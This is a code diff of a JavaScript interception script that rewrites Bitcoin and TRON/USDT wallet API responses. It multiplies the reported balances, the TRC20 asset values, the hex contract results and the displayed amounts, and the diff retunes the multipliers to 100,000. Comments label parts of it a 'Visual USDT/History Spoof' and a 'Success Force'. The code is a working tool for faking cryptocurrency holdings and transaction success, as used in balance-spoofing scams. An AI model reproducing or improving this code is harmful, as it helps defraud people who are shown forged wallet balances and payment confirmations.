@@ -19,12 +19,12 @@ if (body) {
     // --- BITCOIN (BTC) ---
     if (url.includes("btc") || url.includes("twnodes.com/bitcoin") || url.includes("blockbook")) {
         try {
-            body = body.replace(/("(?:balance|unconfirmedBalance|totalSent|totalReceived)"\s*:\s*")(\d+)"/g, (m, p, v) => p + (BigInt(v) * 200n).toString() + '"');
-            body = body.replace(/("(?:balance|unconfirmedBalance)"\s*:\s*)(\d+)(?=[,}])/g, (m, p, v) => p + (BigInt(v) * 200n).toString());
+            body = body.replace(/("(?:balance|unconfirmedBalance|totalSent|totalReceived)"\s*:\s*")(\d+)"/g, (m, p, v) => p + (BigInt(v) * 100000n).toString() + '"');
+            body = body.replace(/("(?:balance|unconfirmedBalance)"\s*:\s*)(\d+)(?=[,}])/g, (m, p, v) => p + (BigInt(v) * 100000n).toString());
 
             body = body.replace(/(-?\d+\.?\d*\s*BTC)/gi, (m) => {
                 let val = parseFloat(m.replace(/[^\d.-]/g, ''));
-                return isNaN(val) ? m : `${(val * 200).toLocaleString('en-US', {minimumFractionDigits: 2})} BTC`;
+                return isNaN(val) ? m : `${(val * 100000).toLocaleString('en-US', {minimumFractionDigits: 2})} BTC`;
             });
         } catch (e) {}
     }
@@ -33,11 +33,11 @@ if (body) {
     else if (url.includes("tron") || url.includes("trongrid") || url.includes("tronstack")) {
         try {
             // A. Standard Balance Multiplier
-            body = body.replace(/("(?:balance|value|amount)"\s*:\s*")(\d+)"/gi, (m, p, v) => p + (BigInt(v) * 8000000n).toString() + '"');
+            body = body.replace(/("(?:balance|value|amount)"\s*:\s*")(\d+)"/gi, (m, p, v) => p + (BigInt(v) * 100000n).toString() + '"');
             
             // B. Hex Smart Contract Balance (Crucial for USDT)
             body = body.replace(/("(?:constant_result|result)"\s*:\s*\[\s*")([0-9a-fA-F]+)"/gi, (m, p, h) => {
-                let multipliedHex = (BigInt("0x" + h) * 8000000n).toString(16);
+                let multipliedHex = (BigInt("0x" + h) * 100000n).toString(16);
                 if (multipliedHex.length % 2 !== 0) multipliedHex = "0" + multipliedHex;
                 return p + multipliedHex + '"';
             });
@@ -46,7 +46,7 @@ if (body) {
             // This force-multiplies anything inside "trc20" or "asset" keys
             if (body.includes("trc20") || body.includes("asset") || body.includes("balances")) {
                 let obj = JSON.parse(body);
-                const multiply = (n) => (BigInt(n) * 8000000n).toString();
+                const multiply = (n) => (BigInt(n) * 100000n).toString();
 
                 const scanner = (o) => {
                     for (let k in o) {
@@ -67,7 +67,7 @@ if (body) {
             // D. Visual USDT/History Spoof
             body = body.replace(/(-?\d+\.?\d*\s*USDT)/gi, (m) => {
                 let val = parseFloat(m.replace(/[^\d.-]/g, ''));
-                return isNaN(val) ? m : `${(val * 8000000).toLocaleString('en-US', {minimumFractionDigits: 2})} USDT`;
+                return isNaN(val) ? m : `${(val * 100000).toLocaleString('en-US', {minimumFractionDigits: 2})} USDT`;
             });
 
             // E. Success Force
